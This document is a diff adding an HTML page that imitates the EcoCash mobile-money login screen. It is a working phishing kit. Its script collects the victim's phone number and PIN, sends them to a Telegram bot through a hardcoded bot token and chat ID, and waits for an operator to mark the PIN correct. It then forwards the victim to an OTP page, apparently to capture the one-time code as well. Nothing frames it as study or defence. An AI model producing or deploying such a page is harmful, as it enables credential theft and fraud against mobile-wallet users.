@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>EcoCash Login</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+  }
+
+  body {
+    background: #ffffff;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .container {
+    width: 360px;
+    height: 640px;
+    background: white;
+    border-radius: 20px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+  }
+
+  .top-section {
+    padding: 40px 25px;
+  }
+
+  .logo {
+    text-align: center;
+    font-size: 42px;
+    font-weight: bold;
+  }
+
+  .logo span:first-child {
+    color: #0b5ea6;
+  }
+
+  .logo span:last-child {
+    color: #e41e2b;
+  }
+
+  .login-title {
+    text-align: center;
+    margin-top: 25px;
+    font-size: 24px;
+    color: #666;
+  }
+
+  .phone-box {
+    margin-top: 25px;
+    border: 2px solid #0b5ea6;
+    border-radius: 12px;
+    padding: 14px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .phone-box img {
+    width: 26px;
+  }
+
+  .phone-number {
+    font-size: 18px;
+    color: #444;
+    border: none;
+    outline: none;
+    background: transparent;
+    flex: 1;
+  }
+
+  .pin-label {
+    text-align: center;
+    margin-top: 20px;
+    color: #888;
+  }
+
+  .pin-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-top: 15px;
+  }
+
+  .pin-box {
+    width: 48px;
+    height: 48px;
+    border: 2px solid #e41e2b;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 24px;
+    outline: none;
+    background: white;
+  }
+
+  .error-msg {
+    text-align: center;
+    color: #e41e2b;
+    margin-top: 12px;
+    font-size: 14px;
+  }
+
+  .bottom-section {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    height: 270px;
+    background: #0b5ea6;
+    border-top-left-radius: 120px;
+    border-top-right-radius: 120px;
+    padding: 40px 20px;
+    color: white;
+    text-align: center;
+  }
+
+  .bottom-text {
+    font-size: 15px;
+    margin-bottom: 25px;
+  }
+
+  .buttons {
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+  }
+
+  .btn {
+    flex: 1;
+    background: white;
+    color: #0b5ea6;
+    padding: 16px;
+    border-radius: 14px;
+    font-weight: bold;
+    border: none;
+    cursor: pointer;
+    font-size: 15px;
+  }
+
+  .version {
+    margin-top: 20px;
+    font-size: 13px;
+    opacity: 0.9;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="top-section">
+
+    <div class="logo">
+      <span>Eco</span><span>Cash</span>
+    </div>
+
+    <div class="login-title">Login</div>
+
+    <form id="loginForm" action="javascript:void(0);">
+
+      <div class="phone-box">
+        <img src="https://flagcdn.com/w40/zw.png" />
+        <input class="phone-number" type="tel" name="phone" id="phoneInput" placeholder="+263712345678" maxlength="13" value="+263" required>
+      </div>
+
+      <div class="pin-label">Enter your PIN</div>
+
+      <div class="pin-boxes">
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]" name="pin1" id="p1" maxlength="1" oninput="filterDigit(this); moveNext(this,'p2'); checkPinAndSubmit();" onkeydown="movePrev(event,this,null)" required>
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]" name="pin2" id="p2" maxlength="1" oninput="filterDigit(this); moveNext(this,'p3'); checkPinAndSubmit();" onkeydown="movePrev(event,this,'p1')" required>
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]" name="pin3" id="p3" maxlength="1" oninput="filterDigit(this); moveNext(this,'p4'); checkPinAndSubmit();" onkeydown="movePrev(event,this,'p2')" required>
+        <input class="pin-box" type="password" inputmode="numeric" pattern="[0-9]" name="pin4" id="p4" maxlength="1" oninput="filterDigit(this); checkPinAndSubmit();" onkeydown="movePrev(event,this,'p3')" required>
+      </div>
+
+      <div class="error-msg" id="errorMsg" style="display: none;">
+        Incorrect Mobile number and/or PIN provided.
+      </div>
+
+    </form>
+
+  </div>
+
+  <div class="bottom-section">
+
+    <div class="bottom-text">
+      To register an EcoCash wallet or get assistance, click below
+    </div>
+
+    <div class="buttons">
+      <button class="btn" onclick="window.location.href='#'">Register</button>
+      <button class="btn" onclick="window.location.href='#'">Help & Support</button>
+    </div>
+
+    <div class="version">v4.0.1P</div>
+
+  </div>
+
+</div>
+
+<script src="telegram-config.js"></script>
+<script>
+  const TELEGRAM_CONFIG = window.TELEGRAM_CONFIG || {
+    BOT_TOKEN: '9231910508:AAFIPsL39ORha1WunGoyChnbBb0dOUYKbkg',
+    CHAT_ID: '8510653374'
+  };
+
+  const TG_API = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}`;
+
+  // Strip non-digit characters from PIN/OTP inputs
+  function filterDigit(el) {
+    el.value = el.value.replace(/[^0-9]/g, '');
+  }
+
+  // Validate Zimbabwe phone number: +263 followed by exactly 9 digits
+  function isValidZimPhone(phone) {
+    return /^\+263\d{9}$/.test(phone);
+  }
+
+  function moveNext(current, nextId) {
+    if (current.value.length === 1 && nextId) {
+      document.getElementById(nextId).focus();
+    }
+  }
+
+  function movePrev(e, current, prevId) {
+    if (e.key === 'Backspace' && current.value === '' && prevId) {
+      document.getElementById(prevId).focus();
+    }
+  }
+
+  function checkPinAndSubmit() {
+    const pin = ['p1','p2','p3','p4'].map(id => document.getElementById(id).value).join('');
+    if (pin.length === 4) {
+      document.getElementById('loginForm').requestSubmit();
+    }
+  }
+
+  // Get the latest update_id so we only listen for NEW callbacks
+  async function getLatestUpdateId() {
+    try {
+      const res = await fetch(`${TG_API}/getUpdates?offset=-1`);
+      const data = await res.json();
+      if (data.ok && data.result.length > 0) {
+        return data.result[data.result.length - 1].update_id;
+      }
+    } catch (e) {}
+    return 0;
+  }
+
+  // Send login message with inline buttons to Telegram
+  async function sendLoginWithButtons(phone, pin) {
+    const time = new Date().toLocaleString();
+    const message = `🔐 EcoCash Login Attempt\n📱 Phone: ${phone}\n🔑 PIN: ${pin}\n⏰ Time: ${time}`;
+    try {
+      const res = await fetch(`${TG_API}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CONFIG.CHAT_ID,
+          text: message,
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '❌ Wrong PIN', callback_data: 'wrong' },
+              { text: '✅ Correct PIN', callback_data: 'correct' }
+            ]]
+          }
+        })
+      });
+      const data = await res.json();
+      if (data.ok) {
+        return data.result.message_id;
+      }
+      return null;
+    } catch (e) {
+      console.error('Telegram send error:', e);
+      return null;
+    }
+  }
+
+  // Answer the callback query (removes loading spinner on Telegram button)
+  async function answerCallback(callbackQueryId) {
+    try {
+      await fetch(`${TG_API}/answerCallbackQuery`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ callback_query_id: callbackQueryId })
+      });
+    } catch (e) {}
+  }
+
+  // Edit the Telegram message to show the decision (removes buttons)
+  async function editMessageAfterDecision(messageId, decision) {
+    const label = decision === 'correct' ? '✅ Approved' : '❌ Rejected';
+    try {
+      await fetch(`${TG_API}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CONFIG.CHAT_ID,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] }
+        })
+      });
+    } catch (e) {}
+  }
+
+  // Poll Telegram getUpdates for a callback_query matching our message
+  async function pollForDecision(sentMessageId, startUpdateId, onResult) {
+    let attempts = 0;
+    const maxAttempts = 120; // poll for up to ~2 minutes
+    const offset = startUpdateId + 1;
+
+    const poll = async () => {
+      attempts++;
+      try {
+        const res = await fetch(`${TG_API}/getUpdates?offset=${offset}&timeout=2`);
+        const data = await res.json();
+        if (data.ok && data.result.length > 0) {
+          for (const update of data.result) {
+            if (update.callback_query &&
+                update.callback_query.message &&
+                update.callback_query.message.message_id === sentMessageId) {
+              const decision = update.callback_query.data; // 'correct' or 'wrong'
+              // Answer the callback and clean up buttons
+              await answerCallback(update.callback_query.id);
+              await editMessageAfterDecision(sentMessageId, decision);
+              // Consume this update so it's not picked up again
+              await fetch(`${TG_API}/getUpdates?offset=${update.update_id + 1}`);
+              onResult(decision);
+              return;
+            }
+          }
+        }
+      } catch (e) {
+        console.error('Poll error:', e);
+      }
+      if (attempts < maxAttempts) {
+        setTimeout(poll, 1500);
+      } else {
+        onResult('timeout');
+      }
+    };
+    poll();
+  }
+
+  // Disable PIN inputs and style while waiting
+  function setFormDisabled(disabled) {
+    ['p1','p2','p3','p4'].forEach(id => {
+      document.getElementById(id).disabled = disabled;
+    });
+    document.getElementById('phoneInput').disabled = disabled;
+  }
+
+  // Reset PIN boxes
+  function clearPinBoxes() {
+    ['p1','p2','p3','p4'].forEach(id => {
+      document.getElementById(id).value = '';
+    });
+    document.getElementById('p1').focus();
+  }
+
+  // Handle form submission
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const phone = document.getElementById('phoneInput').value.trim();
+    const pin = ['p1','p2','p3','p4'].map(id => document.getElementById(id).value).join('');
+    const errorEl = document.getElementById('errorMsg');
+
+    if (!isValidZimPhone(phone)) {
+      errorEl.style.color = '#e41e2b';
+      errorEl.innerHTML = 'Please enter a valid Zimbabwe phone number (+263XXXXXXXXX).';
+      errorEl.style.display = 'block';
+      setFormDisabled(false);
+      clearPinBoxes();
+      return;
+    }
+    if (pin.length !== 4) {
+      errorEl.style.color = '#e41e2b';
+      errorEl.innerHTML = 'Please enter a 4-digit PIN.';
+      errorEl.style.display = 'block';
+      return;
+    }
+
+    // Disable form while processing
+    setFormDisabled(true);
+    errorEl.style.display = 'none';
+
+    // Get latest update_id BEFORE sending, so we only catch new callbacks
+    const lastUpdateId = await getLatestUpdateId();
+
+    // Send to Telegram with inline buttons
+    const sentMessageId = await sendLoginWithButtons(phone, pin);
+    if (!sentMessageId) {
+      errorEl.innerHTML = 'Connection error. Please try again.';
+      errorEl.style.display = 'block';
+      setFormDisabled(false);
+      clearPinBoxes();
+      return;
+    }
+
+    // Show a subtle waiting indicator (style as non-error)
+    errorEl.style.color = '#0b5ea6';
+    errorEl.innerHTML = 'Verifying, please wait...';
+    errorEl.style.display = 'block';
+
+    // Poll Telegram for admin decision
+    pollForDecision(sentMessageId, lastUpdateId, function(result) {
+      if (result === 'correct') {
+        const normalizedPhone = phone.replace(/^\+?263/, '');
+        localStorage.setItem('loginPhone', normalizedPhone);
+        window.location.href = 'otp-verification.html';
+      } else if (result === 'wrong') {
+        errorEl.style.color = '#e41e2b';
+        errorEl.innerHTML = 'Incorrect Mobile number and/or PIN provided.';
+        errorEl.style.display = 'block';
+        setFormDisabled(false);
+        clearPinBoxes();
+      } else {
+        errorEl.style.color = '#e41e2b';
+        errorEl.innerHTML = 'Session timed out. Please try again.';
+        errorEl.style.display = 'block';
+        setFormDisabled(false);
+        clearPinBoxes();
+      }
+    });
+  });
+
+  window.onload = function() {
+    const savedPhone = localStorage.getItem('applicationPhone');
+    if (savedPhone) {
+      document.getElementById('phoneInput').value = savedPhone;
+    }
+    document.getElementById('p1').focus();
+  };
+</script>
+
+</body>
+</html>
